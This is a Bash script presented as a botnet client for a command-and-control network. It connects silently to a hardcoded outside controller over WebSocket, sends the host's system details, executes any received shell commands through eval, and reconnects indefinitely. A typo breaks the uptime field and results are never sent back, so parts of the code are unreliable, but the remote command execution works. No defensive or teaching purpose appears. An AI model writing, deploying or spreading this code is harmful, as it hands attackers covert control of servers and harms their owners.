#!/bin/bash

# payload.sh — Bot client for network C2 (Bash version)
# Run this on any server:  ./payload.sh
# Requires: websocat (install with: apt install websocat or similar)
# It will connect to the controller via WebSocket and stay connected silently.
# Auto-reconnects on disconnect. Executes received shell commands and reports results.

# ─── Config ───────────────────────────────────────────────────────────────────
CONTROLLER_URL="ws://node22.lunes.host:3231/connect"
RECONNECT_DELAY=5   # seconds to wait before reconnect
HEARTBEAT_INTERVAL=20 # seconds between heartbeat pings

# ─── Debug Flag ───────────────────────────────────────────────────────────────
DEBUG=false
if [[ "$1" == "--debug" ]]; then
    DEBUG=true
fi

# ─── Functions ────────────────────────────────────────────────────────────────
log() {
    if [[ "$DEBUG" == true ]]; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') [DEBUG] $1" >&2
    fi
}

error() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR] $1" >&2
}

get_system_info() {
    # Get basic system info
    ARCH=$(uname -m)
    OS=$(uname -s)
    HOSTNAME=$(hostname)
    UPTIME=$(uptime -p 2>/dev/null || uptime)

    # Create JSON-like info
    echo "{\"arch\":\"$ARCH\",\"os\":\"$OS\",\"hostname\":\"$HOSTNAME\",\"uptime\":\"$UPIME\"}"
}

execute_command() {
    local cmd="$1"
    log "Executing command: $cmd"

    # Execute command and capture output
    if output=$(eval "$cmd" 2>&1); then
        echo "$output"
    else
        echo "Command failed: $output"
    fi
}

# ─── Main Loop ───────────────────────────────────────────────────────────────
log "Starting bot client..."
log "Controller URL: $CONTROLLER_URL"

while true; do
    log "Attempting to connect to controller..."

    # Check if websocat is available
    if ! command -v websocat &> /dev/null; then
        error "websocat is not installed. Please install it first."
        error "On Ubuntu/Debian: sudo apt install websocat"
        error "On CentOS/RHEL: sudo yum install websocat"
        exit 1
    fi

    # Get system info
    SYS_INFO=$(get_system_info)
    log "System info: $SYS_INFO"

    # Connect to WebSocket and handle messages
    # This is a simplified version - in practice, you'd need proper WebSocket handling
    echo "$SYS_INFO" | websocat -t -u "$CONTROLLER_URL" 2>/dev/null | while IFS= read -r line; do
        log "Received: $line"

        # Parse JSON message (simplified - assumes format: {"type":"cmd","args":"command"})
        if [[ $line == *'"type":"cmd"'* ]]; then
            # Extract command from args
            CMD=$(echo "$line" | sed -n 's/.*"args":"\([^"]*\)".*/\1/p')
            if [[ -n "$CMD" ]]; then
                RESULT=$(execute_command "$CMD")
                # In a real implementation, you'd send result back via WebSocket
                log "Command result: $RESULT"
            fi
        fi
    done

    # If connection fails, wait and retry
    error "Connection lost. Reconnecting in $RECONNECT_DELAY seconds..."
    sleep $RECONNECT_DELAY
done